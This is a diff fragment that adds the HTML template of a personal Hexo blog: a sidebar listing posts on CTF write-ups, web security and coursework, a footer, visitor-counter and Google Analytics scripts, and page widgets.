href="/weiji-experiment.html">微机实验记录</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-6month.html">安恒6月赛部分做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/python-DataStruct-2.html">数据结构复习二 双向链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/python-DataStruct-1.html">数据结构复习一 单链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/writing-1.html">两年</a></li><li class="post-list-item"><a class="post-list-link" href="/Yii-probleam.html">编写Yii框架项目时出现的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/susctf2018-wp.html">SUSCTF 2018 做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Docker-CTFd-building.html">Docker练习及在CTFd平台上放题目</a></li><li class="post-list-item"><a class="post-list-link" href="/CTFd-building.html">CTFd平台搭建记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Docker-learning.html">Docker学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/ISCC-2018-wp.html">ISCC 2018做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-5month.html">安恒5月赛web题目做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/cumt-2018-final.html">cumt2018校赛部分write up</a></li><li class="post-list-item"><a class="post-list-link" href="/whalectf-web2.html">WhaleCTF第二期打卡的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/git-learning.html">Git学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/PHP-Yii.html">PHP_Yii框架学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/whalectf-web1.html">WhaleCTF第一期打卡的几个web题目</a></li><li class="post-list-item"><a class="post-list-link" href="/shiyanba1-wp.html">实验吧 忘记密码了wp</a></li><li class="post-list-item"><a class="post-list-link" href="/phpcheck2.html">记一道代码审计题目</a></li><li class="post-list-item"><a class="post-list-link" href="/CTF-python.html">小结一波CTF里面可能用到的脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/Ubantu-Web.html">Ubantu下部署LAMP以及复现一道CTF题目</a></li><li class="post-list-item"><a class="post-list-link" href="/cumt-php-fanxuliehua.html">浅析cumt平台上的一道反序列化题目</a></li><li class="post-list-item"><a class="post-list-link" href="/RaceConditionsSummary.html">简单小结一下Web条件竞争的题目</a></li><li class="post-list-item"><a class="post-list-link" href="/hash-length-attack.html">记录一下Hash长度扩展攻击的几个题目</a></li><li class="post-list-item"><a class="post-list-link" href="/moctf-web.html">简单小结一下moctf的三道web题</a></li><li class="post-list-item"><a class="post-list-link" href="/backup-blog-again.html">重装系统后快速恢复hexo博客(保留了原有的博客文件夹)</a></li><li class="post-list-item"><a class="post-list-link" href="/RSA-SimpleLearn.html">大致了解一下RSA以及出题套路</a></li><li class="post-list-item"><a class="post-list-link" href="/CRC32-Brute.html">CRC32爆破小结</a></li><li class="post-list-item"><a class="post-list-link" href="/Linux-learn.html">熟悉Linux命令~~~</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-php-check.html">bugku 代码审计 write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Web-write-up.html">bugku Web write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Misc.html">bugku Misc write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Crypto.html">bugku Crypto write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-social-wp.html">bugku Social write up</a></li><li class="post-list-item"><a class="post-list-link" href="/zipfalse.html">zip伪加密[转载]</a></li><li class="post-list-item"><a class="post-list-link" href="/php-mysql-content.html">php+mysql留言板实现代码分享</a></li><li class="post-list-item"><a class="post-list-link" href="/sql-Summary.html">对数据库学习的大致总结</a></li><li class="post-list-item"><a class="post-list-link" href="/php summary.html">php留言板编写总结</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work4.html">程序设计课 C#的作业报告四</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work3.html">程序设计课 C#的作业报告三</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work2.html">程序设计课 C#作业报告二</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work1.html">程序设计课 C#的作业报告一</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2019 0verWatch
+
+            </div>
+            <div class="footer-right">
+                Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> 
+                <span>|  Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+
+                
+
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-119588656-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
